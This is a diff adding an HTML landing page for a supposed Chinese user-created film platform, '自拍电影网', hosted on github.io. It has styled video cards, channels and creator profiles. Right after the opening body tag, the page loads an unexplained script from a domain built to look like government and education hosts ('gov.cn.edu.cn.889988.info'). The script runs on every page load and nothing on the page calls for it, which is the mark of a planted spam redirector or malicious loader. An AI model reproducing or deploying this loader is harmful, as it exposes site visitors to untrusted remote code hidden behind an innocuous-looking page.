@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>自拍电影网 - 全民创作影视平台 | 原创短视频与独立电影在线展映</title>
+<meta name="description" content="自拍电影网(zipaidianyingwang-top)是一个面向全民创作者的影视作品展示与观看平台。从手机自拍短片到专业独立电影，从Vlog到微电影，汇聚千万创作者的原创光影故事。人人都是导演，每一帧都是生活。">
+<meta name="keywords" content="自拍电影网, 原创短视频, 独立电影, 微电影, 全民创作, 手机拍片, zipaidianyingwang-top">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"SF Pro Display","PingFang SC","Microsoft YaHei",sans-serif;background:#0a0a0f;color:#e0e0e0;line-height:1.6;overflow-x:hidden}
+
+/* 霓虹背景动画 */
+body::before{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 20% 50%,rgba(120,0,255,.08),transparent 60%),radial-gradient(ellipse at 80% 20%,rgba(255,0,128,.06),transparent 50%);z-index:-1}
+
+/* 悬浮圆形导航 */
+.orb-nav{position:fixed;right:1.5rem;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:.6rem}
+.orb-nav a{width:44px;height:44px;border-radius:50%;background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border:1px solid rgba(255,0,128,.3);display:flex;align-items:center;justify-content:center;font-size:1.1rem;transition:.3s;position:relative}
+.orb-nav a:hover,.orb-nav a.active{background:rgba(255,0,128,.2);border-color:#ff0080;transform:scale(1.15);box-shadow:0 0 20px rgba(255,0,128,.4)}
+.orb-nav a .tip{position:absolute;right:120%;top:50%;transform:translateY(-50%);background:#ff0080;color:#fff;padding:.25rem .75rem;border-radius:4px;font-size:.75rem;white-space:nowrap;opacity:0;pointer-events:none;transition:.2s;font-weight:600}
+.orb-nav a:hover .tip{opacity:1}
+
+/* 顶部Hero */
+.hero{height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+.hero-bg{position:absolute;inset:0;background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 50%,#0a0a0f 100%)}
+.hero-bg::after{content:"";position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ff0080' fill-opacity='0.03'%3E%3Ccircle cx='40' cy='40' r='1'/%3E%3C/g%3E%3C/svg%3E")}
+.hero-content{text-align:center;z-index:2;padding:2rem}
+.hero-content .badge{display:inline-flex;align-items:center;gap:.5rem;padding:.4rem 1.2rem;border:1px solid rgba(255,0,128,.5);border-radius:999px;font-size:.75rem;color:#ff0080;letter-spacing:2px;text-transform:uppercase;margin-bottom:2rem}
+.hero-content .badge::before{content:"";width:8px;height:8px;border-radius:50%;background:#ff0080;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.5)}}
+.hero-content h1{font-size:clamp(2.5rem,8vw,6rem);font-weight:900;letter-spacing:-3px;line-height:1;margin-bottom:1rem}
+.hero-content h1 .gradient{background:linear-gradient(135deg,#ff0080,#7928ca,#00d4ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-content p{font-size:clamp(1rem,2vw,1.3rem);color:#999;max-width:520px;margin:0 auto 2.5rem}
+.hero-content .cta-row{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
+.cta-btn{padding:1rem 2.5rem;border-radius:999px;font-weight:700;font-size:.95rem;transition:.3s;cursor:pointer;border:none}
+.cta-primary{background:linear-gradient(135deg,#ff0080,#7928ca);color:#fff;box-shadow:0 4px 30px rgba(255,0,128,.3)}
+.cta-primary:hover{transform:translateY(-2px);box-shadow:0 8px 40px rgba(255,0,128,.5)}
+.cta-outline{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.3)}
+.cta-outline:hover{border-color:#00d4ff;color:#00d4ff}
+.hero-scroll{position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);color:#555;font-size:.8rem;animation:bounce 2s infinite}
+@keyframes bounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(8px)}}
+
+/* 主容器 */
+.container{max-width:1300px;margin:0 auto;padding:0 1.5rem}
+
+/* 不对称瀑布流 */
+.masonry{columns:3 320px;column-gap:1.5rem;padding:4rem 0}
+.masonry-item{break-inside:avoid;margin-bottom:1.5rem;border-radius:12px;overflow:hidden;position:relative;cursor:pointer;transition:.3s}
+.masonry-item:hover{transform:translateY(-4px);box-shadow:0 12px 40px rgba(255,0,128,.15)}
+.masonry-item .item-cover{width:100%;display:flex;align-items:center;justify-content:center;font-size:3rem;position:relative}
+.masonry-item .item-cover .duration{position:absolute;bottom:8px;right:8px;background:rgba(0,0,0,.8);color:#fff;font-size:.7rem;padding:.2rem .5rem;border-radius:3px;font-weight:600}
+.masonry-item .item-info{padding:1rem;background:#111118;border:1px solid #222; border-top:none}
+.masonry-item .item-info h3{font-size:.95rem;font-weight:700;margin-bottom:.3rem}
+.masonry-item .item-info .author{font-size:.8rem;color:#ff0080;display:flex;align-items:center;gap:.4rem}
+.masonry-item .item-info .stats{font-size:.75rem;color:#555;margin-top:.4rem;display:flex;gap:1rem}
+.masonry-item:nth-child(1) .item-cover{height:280px;background:linear-gradient(135deg,#1a0a2e,#ff0080)}
+.masonry-item:nth-child(2) .item-cover{height:200px;background:linear-gradient(135deg,#0a1628,#00d4ff)}
+.masonry-item:nth-child(3) .item-cover{height:320px;background:linear-gradient(135deg,#1a1a0a,#ffaa00)}
+.masonry-item:nth-child(4) .item-cover{height:240px;background:linear-gradient(135deg,#0a1a0a,#00ff88)}
+.masonry-item:nth-child(5) .item-cover{height:360px;background:linear-gradient(135deg,#1a0a0a,#ff0040)}
+.masonry-item:nth-child(6) .item-cover{height:220px;background:linear-gradient(135deg,#0a0a1a,#7928ca)}
+.masonry-item:nth-child(7) .item-cover{height:290px;background:linear-gradient(135deg,#1a1a2e,#e94560)}
+.masonry-item:nth-child(8) .item-cover{height:260px;background:linear-gradient(135deg,#0a2a1a,#38ef7d)}
+.masonry-item:nth-child(9) .item-cover{height:300px;background:linear-gradient(135deg,#2a0a1a,#f72585)}
+
+/* 频道横条 */
+.channel-bar{padding:3rem 0;border-top:1px solid #222}
+.channel-bar h2{font-size:1.8rem;font-weight:900;margin-bottom:1.5rem;display:flex;align-items:center;gap:1rem}
+.channel-bar h2 .line{flex:1;height:1px;background:linear-gradient(to right,transparent,#ff0080,transparent)}
+.channel-row{display:flex;gap:1rem;overflow-x:auto;padding-bottom:1rem;scrollbar-width:none}
+.channel-row::-webkit-scrollbar{display:none}
+.channel-chip{flex-shrink:0;padding:.7rem 1.5rem;border:1px solid #333;border-radius:999px;font-size:.9rem;font-weight:500;transition:.2s;cursor:pointer}
+.channel-chip:hover{border-color:#ff0080;color:#ff0080;background:rgba(255,0,128,.05)}
+.channel-chip.active{background:#ff0080;color:#fff;border-color:#ff0080}
+
+/* 数据面板 */
+.stats-panel{display:grid;grid-template-columns:repeat(4,1fr);gap:1.5rem;padding:3rem 0;border-top:1px solid #222}
+.stat-box{text-align:center;padding:1.5rem}
+.stat-box .num{font-size:2.5rem;font-weight:900;background:linear-gradient(135deg,#ff0080,#00d4ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.stat-box .label{font-size:.85rem;color:#666;margin-top:.25rem}
+
+/* 创作者专区 */
+.creator-section{padding:3rem 0;border-top:1px solid #222}
+.creator-section h2{font-size:1.8rem;font-weight:900;margin-bottom:2rem}
+.creator-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.5rem}
+.creator-card{background:#111118;border:1px solid #222;border-radius:12px;padding:1.5rem;text-align:center;transition:.3s}
+.creator-card:hover{border-color:rgba(0,212,255,.4);transform:translateY(-4px)}
+.creator-avatar{width:64px;height:64px;border-radius:50%;margin:0 auto 1rem;display:flex;align-items:center;justify-content:center;font-size:1.8rem}
+.creator-card h4{font-size:1rem;font-weight:700;margin-bottom:.25rem}
+.creator-card p{font-size:.8rem;color:#666;margin-bottom:.75rem}
+.creator-card .follow{display:inline-block;padding:.4rem 1.2rem;border:1px solid #00d4ff;color:#00d4ff;border-radius:999px;font-size:.8rem;font-weight:600;transition:.2s}
+.creator-card .follow:hover{background:#00d4ff;color:#0a0a0f}
+
+/* 关于区 */
+.about-section{padding:4rem 0;border-top:1px solid #222;display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center}
+.about-text h2{font-size:2rem;font-weight:900;margin-bottom:1rem}
+.about-text h2 span{color:#ff0080}
+.about-text p{color:#888;margin-bottom:1.5rem}
+.about-features{list-style:none}
+.about-features li{padding:.75rem 0;display:flex;align-items:center;gap:.75rem;font-size:.9rem;border-bottom:1px solid #1a1a1a}
+.about-features li::before{content:"▶";color:#ff0080;font-size:.6rem}
+.about-visual{background:linear-gradient(135deg,rgba(255,0,128,.1),rgba(0,212,255,.1));border:1px solid #222;border-radius:16px;padding:2rem;text-align:center}
+.about-visual .url-display{font-family:"Courier New",monospace;font-size:.85rem;color:#00d4ff;word-break:break-all;padding:1rem;background:#0a0a0f;border-radius:8px;border:1px dashed #333;margin-top:1rem}
+
+/* 页脚 */
+.footer{border-top:1px solid #222;padding:3rem 1.5rem 2rem;text-align:center}
+.footer .logo{font-size:1.5rem;font-weight:900;margin-bottom:.5rem}
+.footer .logo span{color:#ff0080}
+.footer p{color:#555;font-size:.8rem;margin-bottom:.5rem}
+.footer .links{display:flex;justify-content:center;gap:1.5rem;margin:1.5rem 0;flex-wrap:wrap}
+.footer .links a{color:#666;font-size:.85rem;transition:.2s}
+.footer .links a:hover{color:#ff0080}
+
+@media(max-width:768px){
+.orb-nav{display:none}
+.hero-content h1{letter-spacing:-1px}
+.masonry{columns:2 150px;column-gap:1rem}
+.masonry-item .item-cover{font-size:2rem}
+.stats-panel{grid-template-columns:repeat(2,1fr);gap:1rem}
+.about-section{grid-template-columns:1fr;gap:2rem}
+.creator-grid{grid-template-columns:repeat(2,1fr)}
+.channel-row{gap:.75rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 悬浮圆形导航 -->
+<nav class="orb-nav">
+<a href="#" class="active"><span class="tip">首页</span>🏠</a>
+<a href="#explore"><span class="tip">探索</span>🔍</a>
+<a href="#channels"><span class="tip">频道</span>📺</a>
+<a href="#creators"><span class="tip">创作者</span>🎥</a>
+<a href="#about"><span class="tip">关于</span>ℹ️</a>
+</nav>
+
+<!-- Hero首屏 -->
+<section class="hero">
+<div class="hero-bg"></div>
+<div class="hero-content">
+<span class="badge">Creator Powered</span>
+<h1><span class="gradient">自拍电影网</span></h1>
+<p>每个人都是生活的导演。从手机镜头到银幕光影，发现千万创作者的原创故事，记录属于这个时代的真实瞬间。</p>
+<div class="cta-row">
+<button class="cta-btn cta-primary">开始探索</button>
+<button class="cta-btn cta-outline">上传作品</button>
+</div>
+<div style="margin-top:1.5rem;font-size:.75rem;color:#555">访问入口：zipaidianyingwang-top.github.io</div>
+</div>
+<div class="hero-scroll">↓ 向下滚动</div>
+</section>
+
+<!-- 探索瀑布流 -->
+<section class="container" id="explore">
+<div style="padding:3rem 0 0;text-align:center">
+<h2 style="font-size:2rem;font-weight:900;margin-bottom:.5rem">🔥 热门作品</h2>
+<p style="color:#666;font-size:.9rem">实时更新的创作者精选内容</p>
+</div>
+<div class="masonry">
+<div class="masonry-item">
+<div class="item-cover"><span>📱</span><span class="duration">3:42</span></div>
+<div class="item-info">
+<h3>凌晨三点的便利店</h3>
+<div class="author">@夜猫子导演</div>
+<div class="stats"><span>👁 12.6万</span><span>❤ 3.2k</span><span>💬 486</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🎥</span><span class="duration">18:05</span></div>
+<div class="item-info">
+<h3>我的外婆和她的老房子</h3>
+<div class="author">@回乡青年</div>
+<div class="stats"><span>👁 8.9万</span><span>❤ 5.1k</span><span>💬 892</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🌆</span><span class="duration">7:30</span></div>
+<div class="item-info">
+<h3>城中村的一天</h3>
+<div class="author">@城市漫游者</div>
+<div class="stats"><span>👁 23.1万</span><span>❤ 8.7k</span><span>💬 1.2k</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🎭</span><span class="duration">12:18</span></div>
+<div class="item-info">
+<h3>毕业前的最后一个周末</h3>
+<div class="author">@校园映画</div>
+<div class="stats"><span>👁 15.3万</span><span>❤ 4.6k</span><span>💬 634</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🏔️</span><span class="duration">25:40</span></div>
+<div class="item-info">
+<h3>独行西藏：一个人的公路片</h3>
+<div class="author">@自由镜头</div>
+<div class="stats"><span>👁 31.7万</span><span>❤ 12k</span><span>💬 2.1k</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🍜</span><span class="duration">5:12</span></div>
+<div class="item-info">
+<h3>凌晨四点的早餐摊</h3>
+<div class="author">@烟火人间</div>
+<div class="stats"><span>👁 6.8万</span><span>❤ 2.1k</span><span>💬 312</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🎨</span><span class="duration">9:55</span></div>
+<div class="item-info">
+<h3>街头涂鸦师的24小时</h3>
+<div class="author">@城市画布</div>
+<div class="stats"><span>👁 19.4万</span><span>❤ 6.3k</span><span>💬 978</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🐕</span><span class="duration">4:20</span></div>
+<div class="item-info">
+<h3>流浪狗救助日记</h3>
+<div class="author">@毛孩子之家</div>
+<div class="stats"><span>👁 42.8万</span><span>❤ 18k</span><span>💬 3.4k</span></div>
+</div>
+</div>
+<div class="masonry-item">
+<div class="item-cover"><span>🎸</span><span class="duration">6:38</span></div>
+<div class="item-info">
+<h3>地铁口的流浪歌手</h3>
+<div class="author">@声音猎人</div>
+<div class="stats"><span>👁 11.2万</span><span>❤ 3.8k</span><span>💬 521</span></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- 频道横条 -->
+<section class="container" id="channels">
+<div class="channel-bar">
+<h2><span class="line"></span> 频道分类 <span class="line"></span></h2>
+<div class="channel-row">
+<div class="channel-chip active">全部</div>
+<div class="channel-chip">Vlog日记</div>
+<div class="channel-chip">微电影</div>
+<div class="channel-chip">纪录片</div>
+<div class="channel-chip">搞笑短片</div>
+<div class="channel-chip">音乐MV</div>
+<div class="channel-chip">旅行记录</div>
+<div class="channel-chip">美食探店</div>
+<div class="channel-chip">技能教程</div>
+<div class="channel-chip">生活实验</div>
+<div class="channel-chip">街头采访</div>
+<div class="channel-chip">动画短片</div>
+</div>
+</div>
+</section>
+
+<!-- 数据面板 -->
+<section class="container">
+<div class="stats-panel">
+<div class="stat-box"><div class="num">128万+</div><div class="label">原创作品</div></div>
+<div class="stat-box"><div class="num">36万+</div><div class="label">注册创作者</div></div>
+<div class="stat-box"><div class="num">5.2亿</div><div class="label">累计播放</div></div>
+<div class="stat-box"><div class="num">156个</div><div class="label">覆盖城市</div></div>
+</div>
+</section>
+
+<!-- 创作者专区 -->
+<section class="container" id="creators">
+<div class="creator-section">
+<h2>✨ 本周推荐创作者</h2>
+<div class="creator-grid">
+<div class="creator-card">
+<div class="creator-avatar" style="background:linear-gradient(135deg,#ff0080,#7928ca)">🎬</div>
+<h4>@光影捕手</h4>
+<p>用手机记录城市边缘的故事</p>
+<div class="follow">+ 关注</div>
+</div>
+<div class="creator-card">
+<div class="creator-avatar" style="background:linear-gradient(135deg,#00d4ff,#7928ca)">📷</div>
+<h4>@一帧日记</h4>
+<p>每天一个60秒微故事</p>
+<div class="follow">+ 关注</div>
+</div>
+<div class="creator-card">
+<div class="creator-avatar" style="background:linear-gradient(135deg,#00ff88,#00d4ff)">🌍</div>
+<h4>@行走的镜头</h4>
+<p>环球旅行自拍纪录片</p>
+<div class="follow">+ 关注</div>
+</div>
+<div class="creator-card">
+<div class="creator-avatar" style="background:linear-gradient(135deg,#ffaa00,#ff0080)">🎨</div>
+<h4>@实验影像</h4>
+<p>先锋短片与视觉艺术</p>
+<div class="follow">+ 关注</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- 关于区 -->
+<section class="container" id="about">
+<div class="about-section">
+<div class="about-text">
+<h2>关于<span>自拍电影网</span></h2>
+<p>自拍电影网诞生于一个信念：每个人内心都有一个导演梦。我们搭建这个平台，让每一个拿起手机或相机记录生活的人，都能拥有自己的"首映礼"。</p>
+<ul class="about-features">
+<li>零门槛上传：支持手机直拍、剪辑后上传，3分钟发布你的作品</li>
+<li>原创保护：所有作品自动生成时间戳存证，保障创作者权益</li>
+<li>智能分发：AI算法将你的作品精准推送给感兴趣的观众</li>
+<li>创作者学院：免费教程从零教你拍出电影感画面</li>
+<li>年度影展：每年举办线上创作者影展，优秀作品推荐至电影节</li>
+</ul>
+</div>
+<div class="about-visual">
+<div style="font-size:3rem;margin-bottom:1rem">🎥</div>
+<div style="font-size:1.1rem;font-weight:700;margin-bottom:.5rem">官方访问地址</div>
+<div class="url-display">https://zipaidianyingwang-top.github.io</div>
+<div style="font-size:.8rem;color:#555;margin-top:1rem">域名：zipaidianyingwang-top</div>
+</div>
+</div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+<div class="logo">自拍<span>电影网</span></div>
+<div class="links">
+<a href="#">首页</a><a href="#">探索</a><a href="#">频道</a><a href="#">创作者</a><a href="#">关于</a><a href="#">帮助中心</a>
+</div>
+<p>© 2024 自拍电影网 (zipaidianyingwang-top) · 让每一帧都值得被看见</p>
+<p>本站为影视创作者作品展示平台，所有内容均由用户自主上传，版权归原作者所有</p>
+<p style="margin-top:.5rem;color:#333">https://zipaidianyingwang-top.github.io</p>
+</footer>
+
+<script>
+// 频道chip切换
+document.querySelectorAll('.channel-chip').forEach(function(chip){
+chip.addEventListener('click',function(){
+document.querySelectorAll('.channel-chip').forEach(function(c){c.classList.remove('active')});
+this.classList.add('active');
+});
+});
+// 圆形导航高亮
+document.querySelectorAll('.orb-nav a').forEach(function(a){
+a.addEventListener('click',function(){
+document.querySelectorAll('.orb-nav a').forEach(function(nav){nav.classList.remove('active')});
+this.classList.add('active');
+});
+});
+</script>
+</body>
+</html>
